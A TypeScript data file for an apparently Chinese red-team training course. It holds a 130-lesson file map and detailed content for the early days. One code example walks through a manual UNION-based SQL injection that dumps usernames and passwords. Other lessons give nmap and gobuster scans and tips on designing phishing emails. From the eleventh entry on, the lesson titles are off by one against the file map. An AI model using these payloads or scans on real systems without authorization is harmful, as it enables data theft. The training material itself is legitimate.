import { CyberLearningPlan, CyberDay } from './cyberBasic';

export const redteamFileMap: Record<number, string> = {
  1: 'day001-story-开篇.md',
  2: 'day002-story-护网红队行动全记录上.md',
  3: 'day003-story-护网红队行动全记录下.md',
  4: 'day004-story-SQL注入到控制整个内网.md',
  5: 'day005-story-一封钓鱼邮件引发的血案.md',
  6: 'day006-story-零日漏洞在手天下我有.md',
  7: 'day007-story-那些年我们踩过的坑.md',
  8: 'day008-story-年薪百万红队大佬炼成记.md',
  9: 'day009-story-护网TOP10经典战役.md',
  10: 'day010-story-总结看了大神案例你悟了吗.md',
  11: 'day011-beginner-入门篇总览.md',
  12: 'day012-beginner-什么是护网红队.md',
  13: 'day013-beginner-15个基础概念.md',
  14: 'day014-beginner-学习环境搭建.md',
  15: 'day015-beginner-信息收集.md',
  16: 'day016-beginner-入门篇总结.md',
  17: 'day017-basic-基础篇总览.md',
  18: 'day018-basic-SQL注入基础.md',
  19: 'day019-basic-SQL注入进阶.md',
  20: 'day020-basic-SQL注入高级.md',
  21: 'day021-basic-SQL注入模块总结.md',
  22: 'day022-basic-XSS基础.md',
  23: 'day023-basic-XSS进阶.md',
  24: 'day024-basic-XSS高级.md',
  25: 'day025-basic-XSS模块总结.md',
  26: 'day026-basic-文件上传基础.md',
  27: 'day027-basic-文件上传进阶.md',
  28: 'day028-basic-文件上传高级.md',
  29: 'day029-basic-基础篇总复习.md',
  30: 'day030-advanced-进阶篇总览.md',
  31: 'day031-advanced-命令执行基础.md',
  32: 'day032-advanced-命令执行绕过.md',
  33: 'day033-advanced-命令执行模块总结.md',
  34: 'day034-advanced-文件包含基础.md',
  35: 'day035-advanced-文件包含进阶.md',
  36: 'day036-advanced-文件包含模块总结.md',
  37: 'day037-advanced-CSRF跨站请求伪造.md',
  38: 'day038-advanced-SSRF服务端请求伪造.md',
  39: 'day039-advanced-CSRF与SSRF总结.md',
  40: 'day040-advanced-逻辑漏洞基础.md',
  41: 'day041-advanced-越权漏洞详解.md',
  42: 'day042-advanced-其他逻辑漏洞.md',
  43: 'day043-advanced-进阶篇总复习.md',
  44: 'day044-senior-高级篇总览.md',
  45: 'day045-senior-MSF基础入门.md',
  46: 'day046-senior-Meterpreter深入.md',
  47: 'day047-senior-MSF高级应用.md',
  48: 'day048-senior-MSF模块总结.md',
  49: 'day049-senior-Windows提权基础.md',
  50: 'day050-senior-Windows提权进阶.md',
  51: 'day051-senior-Windows提权高级.md',
  52: 'day052-senior-Linux提权技术.md',
  53: 'day053-senior-提权模块总结.md',
  54: 'day054-senior-内网信息收集.md',
  55: 'day055-senior-哈希传递与票据传递.md',
  56: 'day056-senior-横向移动技术大全.md',
  57: 'day057-senior-代理转发与内网穿透.md',
  58: 'day058-senior-横向移动模块总结.md',
  59: 'day059-senior-活动目录基础.md',
  60: 'day060-senior-Kerberos协议与攻击.md',
  61: 'day061-senior-域渗透常用攻击.md',
  62: 'day062-senior-域渗透高级篇总复习.md',
  63: 'day063-expert-大神篇总览.md',
  64: 'day064-expert-CS基础.md',
  65: 'day065-expert-CS进阶.md',
  66: 'day066-expert-CS高级与流量隐匿.md',
  67: 'day067-expert-CS模块总结.md',
  68: 'day068-expert-免杀基础.md',
  69: 'day069-expert-免杀技术基础篇.md',
  70: 'day070-expert-免杀技术进阶篇.md',
  71: 'day071-expert-免杀技术高级篇.md',
  72: 'day072-expert-免杀模块总结.md',
  73: 'day073-expert-社会工程学基础.md',
  74: 'day074-expert-钓鱼邮件攻击.md',
  75: 'day075-expert-高级钓鱼与水坑攻击.md',
  76: 'day076-expert-钓鱼模块总结.md',
  77: 'day077-expert-护网行动详解.md',
  78: 'day078-expert-红队作战流程.md',
  79: 'day079-expert-红队基础设施建设.md',
  80: 'day080-expert-红队工具链与武器化.md',
  81: 'day081-expert-权限维持与痕迹清理.md',
  82: 'day082-expert-红队报告撰写.md',
  83: 'day083-expert-大神篇全书总复习.md',
  84: 'day084-target-靶场系列总览.md',
  85: 'day085-target-靶场1-DVWA.md',
  86: 'day086-target-靶场2-SQLi-Labs.md',
  87: 'day087-target-靶场3-XSS-Challenges.md',
  88: 'day088-target-靶场4-Upload-Labs.md',
  89: 'day089-target-靶场5-WebGoat.md',
  90: 'day090-target-靶场6-bWAPP.md',
  91: 'day091-target-靶场7-Pikachu.md',
  92: 'day092-target-靶场8-其他Web靶场.md',
  93: 'day093-target-靶场9-Vulhub.md',
  94: 'day094-target-靶场10-VulnStack.md',
  95: 'day095-target-靶场11-红日靶场.md',
  96: 'day096-target-靶场12-Boot-to-Root.md',
  97: 'day097-target-靶场13-其他内网靶场.md',
  98: 'day098-target-靶场14-从零搭建域环境.md',
  99: 'day099-target-靶场15-GOAD.md',
  100: 'day100-target-靶场16-DetectionLab.md',
  101: 'day101-target-靶场17-CTFHub.md',
  102: 'day102-target-靶场18-BUUCTF.md',
  103: 'day103-target-靶场19-攻防世界XCTF.md',
  104: 'day104-target-靶场20-护网模拟靶场.md',
  105: 'day105-target-靶场21-CyberRange.md',
  106: 'day106-target-靶场22-企业级靶场搭建.md',
  107: 'day107-target-靶场学习路径推荐.md',
  108: 'day108-target-靶场工具汇总.md',
  109: 'day109-target-靶场常见问题FAQ.md',
  110: 'day110-appendix-附录A-红队常用工具速查表.md',
  111: 'day111-appendix-附录B-常用命令速查表.md',
  112: 'day112-appendix-附录C-常见端口对照表.md',
  113: 'day113-appendix-附录D-常见漏洞编号对照表.md',
  114: 'day114-appendix-附录E-学习资源推荐.md',
  115: 'day115-appendix-附录F-红队职业发展指南.md',
  116: 'day116-appendix-附录G-法律法规与合规须知.md',
  117: 'day117-appendix-附录H-常见问题FAQ.md',
  118: 'day118-toc-全书目录.md',
  119: 'day119-story-网吧网管到Web渗透大神上.md',
  120: 'day120-story-网吧网管到Web渗透大神下.md',
  121: 'day121-story-运维小白到域渗透专家上.md',
  122: 'day122-story-运维小白到域渗透专家下.md',
  123: 'day123-story-编程菜鸟到免杀大佬上.md',
  124: 'day124-story-编程菜鸟到免杀大佬下.md',
  125: 'day125-story-内向技术宅到社工钓鱼大师上.md',
  126: 'day126-story-内向技术宅到社工钓鱼大师下.md',
  127: 'day127-story-脚本小子到工具开发大神上.md',
  128: 'day128-story-脚本小子到工具开发大神下.md',
  129: 'day129-story-游戏外挂爱好者到0day漏洞猎手上.md',
  130: 'day130-story-游戏外挂爱好者到0day漏洞猎手下.md',
};

const days: CyberDay[] = [];

for (let i = 1; i <= 130; i++) {
  days.push({
    id: `red-${i}`,
    day: i,
    title: `红队学习 Day ${i}`,
    subtitle: `Red Team Day ${i}`,
    objectives: ['掌握红队相关知识', '理解攻击技术', '实战演练'],
    content: `红队学习第${i}天内容`,
    keyPoints: [],
    codeExamples: [],
    labEnvironment: [],
    recommendedTools: [
      { name: 'Kali Linux', description: '渗透测试发行版', url: 'https://www.kali.org/', type: 'local' },
      { name: 'Metasploit', description: '漏洞利用框架', url: 'https://www.metasploit.com/', type: 'local' },
      { name: 'Cobalt Strike', description: '红队作战平台', url: 'https://www.cobaltstrike.com/', type: 'local' },
    ],
    quiz: [],
    resources: [],
    expertNotes: [],
  });
}

days[0].title = '开篇：红队之路从这里开始';
days[0].subtitle = 'Introduction to Red Team';
days[0].objectives = ['了解红队学习路径', '建立学习目标', '准备学习环境'];
days[0].content = `欢迎来到红队实战进阶课程！这是一条通往红队高手的道路。

【课程结构】
• 第0篇（Day1-10）：真实案例篇 - 8个真实护网案例，激发学习动力
• 第1篇（Day11-16）：入门篇 - 15个基础概念，学习环境搭建
• 第2篇（Day17-29）：基础篇 - SQL注入、XSS、文件上传三大核心漏洞
• 第3篇（Day30-43）：进阶篇 - 命令执行、文件包含、CSRF、SSRF、逻辑漏洞
• 第4篇（Day44-62）：高级篇 - MSF、提权、内网渗透、域渗透
• 第5篇（Day63-83）：大神篇 - Cobalt Strike、免杀、社工、红队作战流程
• 第6篇（Day84-109）：靶场实战篇 - 22个靶场，从入门到精通
• 附录（Day110-118）：工具速查、命令速查、职业发展指南

【学习建议】
1. 先看故事，再学技术
2. 理论结合实践，多动手练习
3. 循序渐进，不要急于求成
4. 遇到问题多思考，多查资料
5. 坚持每天学习，积少成多

让我们开始红队之旅吧！`;
days[0].keyPoints = ['红队学习路径设计', '8大真实案例激发动力', '循序渐进的学习计划', '理论与实践相结合'];
days[0].resources = [
  { name: '红队学习路线图', url: 'https://www.freebuf.com/articles/network/298023.html', type: 'article' },
  { name: '护网行动实战记录', url: 'https://www.bilibili.com/video/BV1xx411c764', type: 'video' },
  { name: '《红队攻击实战》', url: 'https://book.douban.com/subject/35226887', type: 'book' },
];
days[0].expertNotes = [
  { author: '余弦', title: '红队学习建议', content: '新手不要一开始就追求高端工具，先把基础漏洞原理搞懂。SQL注入、XSS这些基础漏洞是一切的基石。', url: 'https://nmap.org/' },
  { author: '安全研究员小明', title: '学习心态', content: '红队学习是一个长期过程，不要被眼前的困难吓倒。每天进步一点点，半年后你会发现自己已经脱胎换骨。', url: 'https://www.secjuice.com/' },
];

days[1].title = '护网红队行动全记录（上）';
days[1].subtitle = 'Red Team Operation Record Part 1';
days[1].objectives = ['了解护网行动流程', '学习情报收集方法', '掌握武器库准备'];
days[1].content = `护网行动是国家网络安全实战演练，每年一次，为期1-2周。

【战前准备阶段】
• 组建团队：红队通常由5-10人组成，分工明确
• 情报收集：目标系统信息、人员信息、网络拓扑
• 武器库准备：漏洞利用工具、Payload、免杀样本
• 基础设施：C2服务器、代理、域名

【情报战】
• 公开情报收集：FOFA、Shodan、搜索引擎
• 社工情报：员工信息、社交媒体、内部系统
• 网络情报：IP地址、域名、子域名、技术栈

【分组分工】
• 侦察组：信息收集、漏洞发现
• 突破组：漏洞利用、获取权限
• 内网组：横向移动、域渗透
• 报告组：记录过程、撰写报告

这一章带你走进真实的护网现场！`;
days[1].keyPoints = ['护网行动全流程', '情报收集的重要性', '团队分工协作', '战前准备工作'];
days[1].resources = [
  { name: '护网行动详解', url: 'https://www.anquanke.com/post/id/289012', type: 'article' },
  { name: '护网实战视频', url: 'https://www.bilibili.com/video/BV1xt411N7sR', type: 'video' },
];
days[1].expertNotes = [
  { author: '护网老兵', title: '战前准备的重要性', content: '护网行动中，战前准备占了50%的工作量。情报收集越充分，突破越容易。', url: 'https://blog.knownsec.com/' },
];

days[2].title = '护网红队行动全记录（下）';
days[2].subtitle = 'Red Team Operation Record Part 2';
days[2].objectives = ['学习钓鱼突破技术', '掌握横向移动方法', '了解域控攻坚战'];
days[2].content = `接上一章，继续讲述护网行动的实战过程。

【钓鱼突破】
• 钓鱼邮件设计：精心制作诱饵，引诱目标点击
• 社工技巧：了解目标兴趣，定制攻击方案
• 漏洞利用：Office漏洞、浏览器漏洞、浏览器扩展

【横向移动】
• 内网信息收集：网络拓扑、主机信息、用户信息
• 凭证窃取：哈希传递、票据传递、明文密码
• 横向渗透：SMB、RDP、WinRM、SSH

【域控攻坚战】
• 域信息收集：域架构、域控制器、组策略
• Kerberos攻击：黄金票据、白银票据、Kerberoasting
• 权限提升：本地提权、域内提权、权限维持

【战绩盘点】
• 突破成功率统计
• 技术难点分析
• 经验教训总结

护网行动不仅是技术的较量，更是策略和团队协作的考验！`;
days[2].keyPoints = ['钓鱼突破实战', '横向移动技术', '域渗透攻击', '护网战绩分析'];
days[2].resources = [
  { name: '内网渗透实战指南', url: 'https://www.freebuf.com/articles/network/278901.html', type: 'article' },
  { name: '域渗透视频教程', url: 'https://www.bilibili.com/video/BV1bb411i7cF', type: 'video' },
];

days[3].title = '从一个SQL注入到控制整个内网';
days[3].subtitle = 'From SQL Injection to Internal Network Control';
days[3].objectives = ['理解完整攻击链', '掌握SQL注入利用', '学习内网渗透思路'];
days[3].content = `这是一个真实的案例，展示了从一个简单的SQL注入开始，最终控制整个内网的完整过程。

【攻击链】
1. SQL注入获取WebShell
2. 信息收集发现内网
3. 权限提升获取系统权限
4. 内网扫描发现更多主机
5. 横向移动渗透其他主机
6. 域渗透获取域控权限
7. 权限维持建立持久化

【关键技术点】
• SQL注入：联合查询、报错注入、盲注
• Webshell：中国菜刀、冰蝎、蚁剑
• 内网扫描：Nmap、fscan、哥斯拉
• 权限提升：提权工具、内核漏洞
• 横向移动：SMB、RDP、WinRM

【经验教训】
• 一个小漏洞可能导致整个内网沦陷
• 内网安全意识薄弱是普遍问题
• 权限分离和最小权限原则很重要

这个案例告诉我们：安全是一个整体，任何一个环节的薄弱都可能导致全盘皆输！`;
days[3].keyPoints = ['完整攻击链演示', 'SQL注入到内网控制', '权限提升技术', '横向移动方法'];
days[3].codeExamples = [{ title: 'SQL注入获取数据库信息', language: 'sql', code: '-- 判断注入点\n?id=1 AND 1=1\n?id=1 AND 1=2\n\n-- 猜列数\n?id=1 ORDER BY 3--\n\n-- 联合查询\n?id=1 UNION SELECT 1,version(),database()--\n\n-- 查询所有数据库\n?id=1 UNION SELECT 1,group_concat(schema_name),3 FROM information_schema.schemata--\n\n-- 查询表名\n?id=1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--\n\n-- 查询列名\n?id=1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=\'users\'--\n\n-- 查询数据\n?id=1 UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users--', explanation: 'SQL注入手工利用的完整流程' }];
days[3].resources = [
  { name: 'SQL注入实战教程', url: 'https://www.bilibili.com/video/BV1Bt411o7cE', type: 'video' },
];
days[3].quiz = [
  { type: 'single', question: 'SQL注入联合查询需要什么条件？', options: ['A. 列数相同', 'B. 表名相同', 'C. 数据库相同', 'D. 以上都不对'], correctIndex: 0, explanation: 'UNION要求前后两个查询的列数必须相同，数据类型兼容。' },
  { type: 'single', question: '判断SQL注入列数常用什么方法？', options: ['A. UNION SELECT', 'B. ORDER BY', 'C. GROUP BY', 'D. HAVING'], correctIndex: 1, explanation: '使用ORDER BY n来判断，如果n大于实际列数会报错。' },
];
days[3].expertNotes = [
  { author: '渗透测试工程师', title: '攻击链思维', content: '不要只看眼前的漏洞，要思考这个漏洞能带你去哪里。一个SQL注入可能只是起点，内网才是真正的战场。', url: 'https://www.hackerone.com/' },
];

days[4].title = '一封钓鱼邮件引发的血案';
days[4].subtitle = 'A Phishing Email Incident';
days[4].objectives = ['理解社工攻击原理', '学习钓鱼邮件设计', '掌握社工画像方法'];
days[4].content = `一封精心设计的钓鱼邮件，可能比任何技术漏洞都更有效。

【社工画像】
• 收集目标信息：姓名、职位、兴趣爱好、联系方式
• 分析目标心理：恐惧、贪婪、好奇心、责任感
• 找到切入点：利用目标的弱点和需求

【钓鱼邮件设计】
• 主题设计：紧急通知、工资变动、系统更新
• 内容设计：权威感、紧迫感、可信度
• 附件设计：恶意文档、宏病毒、钓鱼链接

【案例分析】
• 案例1：冒充HR发送工资调整通知
• 案例2：冒充IT部门发送系统升级邮件
• 案例3：利用疫情发送健康码链接

【防护措施】
• 安全培训：提高员工安全意识
• 邮件过滤：阻止恶意邮件
• 多因素认证：即使密码泄露也无法登录

社会工程学是红队最重要的技能之一，永远不要忽视！`;
days[4].keyPoints = ['社工攻击原理', '钓鱼邮件设计技巧', '社工画像方法', '防护措施'];
days[4].resources = [
  { name: '社会工程学指南', url: 'https://www.social-engineer.org/', type: 'article' },
  { name: '钓鱼邮件实战视频', url: 'https://www.bilibili.com/video/BV1wb411K77P', type: 'video' },
];

days[5].title = '零日漏洞在手，天下我有？';
days[5].subtitle = 'Zero-Day Vulnerabilities';
days[5].objectives = ['理解零日漏洞概念', '了解漏洞交易市场', '学习漏洞利用方法'];
days[5].content = `零日漏洞是指未被发现或未被修复的漏洞，是红队最强大的武器。

【零日漏洞概念】
• 零日漏洞：厂商未发布补丁的漏洞
• 1-day漏洞：厂商已发布补丁但用户未修复
• 漏洞生命周期：发现→报告→修复→部署

【漏洞交易市场】
• 漏洞赏金计划：厂商悬赏发现漏洞
• 地下交易市场：高价出售漏洞
• 漏洞研究机构：专业漏洞挖掘

【零日漏洞利用】
• 漏洞挖掘：代码审计、模糊测试、逆向分析
• 利用开发：编写exploit代码
• 武器化：集成到攻击框架中

【风险与伦理】
• 法律风险：未经授权测试违法
• 道德风险：漏洞滥用危害巨大
• 负责任披露：发现漏洞应报告厂商

零日漏洞是双刃剑，使用时必须遵守法律和道德准则！`;
days[5].keyPoints = ['零日漏洞定义', '漏洞交易市场', '漏洞利用开发', '法律与伦理'];
days[5].resources = [
  { name: '漏洞挖掘技术', url: 'https://www.freebuf.com/articles/system/267890.html', type: 'article' },
];

days[6].title = '那些年，我们踩过的坑';
days[6].subtitle = 'Lessons Learned from Failures';
days[6].objectives = ['学习失败案例经验', '避免常见错误', '建立防御思维'];
days[6].content = `失败是成功之母，学习别人的失败经验可以让你少走弯路。

【经典失败案例】
• 案例1：误操作导致目标系统崩溃
• 案例2：Payload被杀毒软件拦截
• 案例3：行动被IDS/IPS检测到
• 案例4：团队配合失误导致暴露
• 案例5：报告撰写不规范被质疑

【常见踩坑点】
• 信息收集不充分
• 漏洞验证不仔细
• Payload免杀不到位
• 内网操作太粗暴
• 没有备份和回滚计划

【避坑指南】
• 行动前制定详细计划
• 先在测试环境验证
• 使用免杀Payload
• 注意操作隐蔽性
• 做好记录和报告

每一个坑都是一次宝贵的经验，学会从失败中吸取教训！`;
days[6].keyPoints = ['失败案例分析', '常见错误总结', '避坑指南', '防御思维'];
days[6].expertNotes = [
  { author: '安全研究员', title: '失败是常态', content: '在红队行动中，失败是常态，成功是偶然。关键是从每次失败中学习，不断改进。', url: 'https://blog.knownsec.com/' },
];

days[7].title = '年薪百万红队大佬炼成记';
days[7].subtitle = 'Red Team Expert Journey';
days[7].objectives = ['了解红队职业发展', '学习成功经验', '制定个人学习计划'];
days[7].content = `5位年薪百万的红队大佬，分享他们的成长故事和经验。

【大佬成长路径】
• 路径1：从CTF选手到红队工程师
• 路径2：从开发转安全，成为漏洞专家
• 路径3：从运维转安全，精通内网渗透
• 路径4：从学术研究到实战专家
• 路径5：自学成才，从草根到大神

【核心能力要求】
• 漏洞挖掘能力：代码审计、模糊测试
• 渗透测试能力：Web、内网、域渗透
• 工具开发能力：Python、Go、Shell脚本
• 团队协作能力：沟通、文档、报告
• 持续学习能力：跟踪新技术、新漏洞

【职业发展建议】
• 打好基础：网络、操作系统、编程
• 专注领域：Web安全、内网渗透、移动安全
• 积累经验：参加CTF、做漏洞挖掘、参与护网
• 提升技能：学习高级技术、开发工具

红队是网络安全领域最具挑战性和最有价值的职业之一！`;
days[7].keyPoints = ['红队职业发展', '核心能力要求', '成长路径', '学习建议'];
days[7].resources = [
  { name: '网络安全职业规划', url: 'https://www.freebuf.com/articles/security/289012.html', type: 'article' },
];

days[8].title = '护网TOP10经典战役盘点';
days[8].subtitle = 'Top 10 Cyber Defense Operations';
days[8].objectives = ['学习经典案例', '分析攻击手法', '总结经验教训'];
days[8].content = `盘点护网行动中最经典的10场战役，学习大神们的操作技巧。

【TOP10经典战役】
1. 封神之战：拿下某大型央企域控
2. 最骚操作：用打印机漏洞突破内网
3. 最长渗透：持续3天的内网漫游
4. 最险突破：在最后1分钟拿下目标
5. 最佳钓鱼：成功率90%的钓鱼邮件
6. 最牛横向：一天拿下100台主机
7. 最巧利用：挖掘到独家零日漏洞
8. 最稳持久：维持权限长达数月
9. 最隐蔽操作：全程未被发现
10. 最佳团队配合：5人团队完美协作

【战役分析】
• 攻击手法分析
• 技术亮点总结
• 防御启示

【经验总结】
• 永远不要低估任何一个漏洞
• 团队协作是成功的关键
• 细节决定成败

这些经典战役是红队学习的宝贵教材！`;
days[8].keyPoints = ['护网经典案例', '攻击手法分析', '经验总结', '防御启示'];

days[9].title = '总结：看了大神案例你悟了吗';
days[9].subtitle = 'Summary and Reflection';
days[9].objectives = ['回顾红队实战案例', '总结关键经验', '制定学习计划'];
days[9].content = `8个真实案例看完了，你有什么感悟？

【关键经验总结】
• 情报收集是基础
• 漏洞利用是手段
• 内网渗透是核心
• 权限维持是保障
• 团队协作是关键

【学习路线图】
1. 入门篇（1周）：基础概念、环境搭建、信息收集
2. 基础篇（2周）：SQL注入、XSS、文件上传
3. 进阶篇（2周）：命令执行、文件包含、CSRF、SSRF
4. 高级篇（3周）：MSF、提权、内网渗透、域渗透
5. 大神篇（3周）：Cobalt Strike、免杀、社工、红队作战
6. 靶场实战（4周）：22个靶场实战练习

【下一步行动】
• 制定每日学习计划
• 搭建学习环境
• 开始入门篇学习

准备好了吗？让我们开始真正的技术学习！`;
days[9].keyPoints = ['案例总结', '学习路线', '行动规划'];

days[10].title = '入门篇总结';
days[10].subtitle = 'Beginner Level Summary';
days[10].objectives = ['回顾入门篇知识', '完成入门测试', '准备进阶学习'];
days[10].content = `入门篇学习结束，回顾所学内容。

【入门篇知识点回顾】
• 护网和红队的概念
• 15个基础概念
• 学习环境搭建
• 信息收集方法

【入门测试】
• 选择题：测试基础知识
• 实操题：环境搭建练习

【进阶学习准备】
• 复习基础概念
• 准备DVWA靶场
• 熟悉Kali Linux常用工具

入门篇是基础，打好基础才能更好地学习后续内容！`;
days[10].keyPoints = ['入门知识回顾', '入门测试', '进阶准备'];

days[11].title = '入门篇总览';
days[11].subtitle = 'Beginner Level Overview';
days[11].objectives = ['了解入门篇内容', '建立学习目标', '准备学习环境'];
days[11].content = `入门篇带你了解红队的基础概念和学习方法。

【入门篇内容】
• Day12：什么是护网红队
• Day13：15个基础概念
• Day14：学习环境搭建
• Day15：信息收集方法
• Day16：入门篇总结

【学习目标】
• 理解红队和护网的概念
• 掌握基础安全术语
• 搭建自己的学习环境
• 学会基本信息收集方法

【学习建议】
• 不要跳过基础概念
• 动手搭建环境
• 多做练习

入门篇虽然简单，但非常重要！`;
days[11].keyPoints = ['入门篇内容', '学习目标', '学习建议'];

days[12].title = '什么是护网红队';
days[12].subtitle = 'What is Red Team';
days[12].objectives = ['理解红队概念', '了解护网行动', '掌握红队工作流程'];
days[12].content = `红队是模拟攻击者的专业团队，护网是国家网络安全实战演练。

【红队概念】
• 红队：模拟真实攻击者，测试目标防御能力
• 蓝队：防御方，检测和响应攻击
• 紫队：红蓝协同，提升整体安全能力

【护网行动】
• 背景：国家网络安全实战演练
• 时间：每年一次，为期1-2周
• 规模：全国范围内的大型演练
• 目的：检验网络安全防护能力

【红队工作流程】
1. 情报收集
2. 漏洞发现
3. 漏洞利用
4. 权限提升
5. 横向移动
6. 目标达成
7. 报告撰写

【红队能力要求】
• 技术能力：漏洞挖掘、渗透测试
• 战术能力：攻击链设计、规避检测
• 战略能力：目标分析、方案制定

红队不仅需要技术，更需要智慧和策略！`;
days[12].keyPoints = ['红队概念', '护网行动', '工作流程', '能力要求'];
days[12].resources = [
  { name: '红队概念详解', url: 'https://www.anquanke.com/post/id/278901', type: 'article' },
];
days[12].quiz = [
  { type: 'single', question: '红队的主要任务是什么？', options: ['A. 防御攻击', 'B. 模拟攻击', 'C. 检测威胁', 'D. 修复漏洞'], correctIndex: 1, explanation: '红队模拟真实攻击者，测试目标防御能力。' },
];

days[13].title = '15个基础概念';
days[13].subtitle = '15 Basic Concepts';
days[13].objectives = ['掌握基础安全术语', '理解核心概念', '建立知识框架'];
days[13].content = `掌握这15个基础概念，打好网络安全基础。

【基础概念列表】
1. 漏洞：系统或软件中的安全缺陷
2. 攻击：利用漏洞获取未授权访问
3. 渗透测试：模拟攻击测试安全性
4. 漏洞利用：编写代码利用漏洞
5. Payload：漏洞利用后执行的代码
6. Shell：远程命令执行环境
7. 权限提升：获取更高权限
8. 横向移动：在网络中从一台主机移动到另一台
9. 信息收集：收集目标系统信息
10. 社会工程学：利用人性弱点获取信息
11. 钓鱼：欺骗用户获取敏感信息
12. 免杀：绕过杀毒软件检测
13. C2：命令与控制服务器
14. IDS/IPS：入侵检测/防御系统
15. 防火墙：网络安全边界设备

【概念关系图】
• 信息收集 → 漏洞发现 → 漏洞利用 → 获取Shell
• Shell → 权限提升 → 横向移动 → 达成目标
• 免杀、C2、社工是贯穿始终的辅助技术

这些概念是学习网络安全的基石！`;
days[13].keyPoints = ['15个基础概念', '概念关系', '知识框架'];
days[13].quiz = [
  { type: 'single', question: '什么是Payload？', options: ['A. 漏洞', 'B. 漏洞利用代码', 'C. 漏洞利用后执行的代码', 'D. 远程Shell'], correctIndex: 2, explanation: 'Payload是漏洞利用成功后在目标上执行的代码。' },
  { type: 'single', question: '横向移动是什么？', options: ['A. 获取更高权限', 'B. 在网络中从一台主机移动到另一台', 'C. 收集信息', 'D. 绕过杀毒软件'], correctIndex: 1, explanation: '横向移动是指在获取一台主机权限后，利用这台主机攻击网络中的其他主机。' },
];

days[14].title = '学习环境搭建';
days[14].subtitle = 'Environment Setup';
days[14].objectives = ['搭建Kali Linux环境', '配置虚拟机', '安装常用工具'];
days[14].content = `工欲善其事，必先利其器。搭建一个良好的学习环境是成功的第一步。

【环境搭建清单】
• 虚拟机软件：VMware Workstation或VirtualBox
• 操作系统：Kali Linux（渗透测试专用）
• 靶场环境：DVWA、SQLi-Labs、Vulhub等
• 常用工具：Burp Suite、Nmap、Metasploit

【搭建步骤】
1. 安装虚拟机软件
2. 下载Kali Linux镜像
3. 创建虚拟机并安装Kali
4. 配置网络连接（桥接模式）
5. 更新系统和工具
6. 安装Burp Suite Pro
7. 搭建靶场环境

【常用命令】
• 更新系统：apt update && apt upgrade
• 安装工具：apt install <工具名>
• 启动MSF：msfconsole
• 启动Burp：burpsuite

【环境验证】
• 启动DVWA靶场
• 用Nmap扫描本地网络
• 用Burp Suite抓包测试

一个良好的学习环境能让你事半功倍！`;
days[14].keyPoints = ['环境搭建步骤', '常用工具', '验证方法'];
days[14].codeExamples = [{ title: 'Kali Linux常用命令', language: 'bash', code: '# 更新系统\napt update && apt upgrade -y\n\n# 安装常用工具\napt install nmap gobuster sqlmap burpsuite -y\n\n# 启动Metasploit\nmsfconsole\n\n# 启动Docker（用于搭建靶场）\nsystemctl start docker\nsystemctl enable docker\n\n# 下载并运行DVWA\ndocker run -d -p 8081:80 vulnerables/web-dvwa\n\n# 扫描本地网络\nnmap -sn 192.168.1.0/24', explanation: 'Kali Linux环境配置和常用命令' }];
days[14].labEnvironment = [{ name: 'DVWA靶场', description: 'Web漏洞练习平台', url: 'http://localhost:8081', type: 'docker', setup: '1. 安装Docker\n2. 运行命令: docker run -d -p 8081:80 vulnerables/web-dvwa\n3. 访问 http://localhost:8081\n4. 登录账号: admin/password\n5. 设置安全级别为Low开始练习', expectedOutput: '成功进入DVWA平台，可进行XSS、SQL注入、CSRF等漏洞练习' }];
days[14].resources = [
  { name: 'Kali Linux安装教程', url: 'https://www.bilibili.com/video/BV17x411c764', type: 'video' },
];

days[15].title = '信息收集';
days[15].subtitle = 'Information Gathering';
days[15].objectives = ['掌握被动信息收集', '学会主动信息收集', '使用信息收集工具'];
days[15].content = `信息收集是渗透测试的第一步，也是最重要的一步。

【被动信息收集】
• WHOIS查询：域名注册信息
• DNS查询：域名解析记录
• 搜索引擎：Google Hacking
• 公开情报平台：FOFA、Shodan、Censys

【主动信息收集】
• 端口扫描：Nmap
• 服务识别：Nmap -sV
• 目录扫描：Gobuster、Dirb
• CMS识别：WhatWeb、Wappalyzer

【信息收集工具】
• Nmap：端口扫描和服务识别
• Gobuster：目录扫描
• theHarvester：邮箱和子域名收集
• FOFA：网络空间搜索引擎

【信息整理】
• 整理收集到的信息
• 构建目标画像
• 分析攻击面

信息收集越充分，攻击越容易成功！`;
days[15].keyPoints = ['被动收集', '主动收集', '工具使用', '信息整理'];
days[15].codeExamples = [{ title: 'Nmap端口扫描', language: 'bash', code: '# 主机发现\nnmap -sn 192.168.1.0/24\n\n# 端口扫描+版本检测\nnmap -sS -sV 192.168.1.100\n\n# 指定端口扫描\nnmap -p 22,80,443,3306 192.168.1.100\n\n# 全面扫描\nnmap -A -T4 192.168.1.100\n\n# 保存结果\nnmap -sS -sV -oN scan_results.txt 192.168.1.100', explanation: 'Nmap常用扫描命令' }, { title: '目录扫描', language: 'bash', code: '# Gobuster目录扫描\ngobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt\n\n# 添加扩展名\ngobuster dir -u http://target.com -w common.txt -x php,html,asp\n\n# 使用ffuf\nffuf -u http://target.com/FUZZ -w common.txt\n\n# 子域名枚举\ngobuster dns -d example.com -w subdomains.txt', explanation: '目录扫描和子域名枚举' }];
days[15].resources = [
  { name: 'Nmap官方手册', url: 'https://nmap.org/book/man.html', type: 'article' },
  { name: '信息收集视频教程', url: 'https://www.bilibili.com/video/BV1xt411N7sR', type: 'video' },
];
days[15].quiz = [
  { type: 'single', question: 'Nmap中-sS参数表示什么？', options: ['A. UDP扫描', 'B. SYN半开扫描', 'C. TCP Connect扫描', 'D. Ping扫描'], correctIndex: 1, explanation: '-sS是SYN半开扫描，速度快且隐蔽。' },
  { type: 'single', question: '被动信息收集的特点是什么？', options: ['A. 直接接触目标', 'B. 不留下访问记录', 'C. 使用端口扫描', 'D. 使用目录扫描'], correctIndex: 1, explanation: '被动收集通过公开渠道获取信息，不直接访问目标系统，不会留下记录。' },
];

days[16].title = '入门篇总结';
days[16].subtitle = 'Beginner Level Summary';
days[16].objectives = ['回顾入门篇知识', '完成入门测试', '准备进阶学习'];
days[16].content = `入门篇学习结束，检验学习成果。

【入门篇知识点】
• 红队和护网概念
• 15个基础概念
• 学习环境搭建
• 信息收集方法

【入门测试】
1. 什么是红队？什么是蓝队？
2. 列举5个基础安全概念并解释
3. 如何搭建Kali Linux学习环境？
4. 被动信息收集和主动信息收集的区别？
5. Nmap常用参数有哪些？

【进阶学习准备】
• 掌握Kali基本操作
• 熟悉Nmap、Gobuster等工具
• 搭建DVWA靶场
• 准备开始SQL注入学习

入门篇结束，准备进入基础篇学习！`;
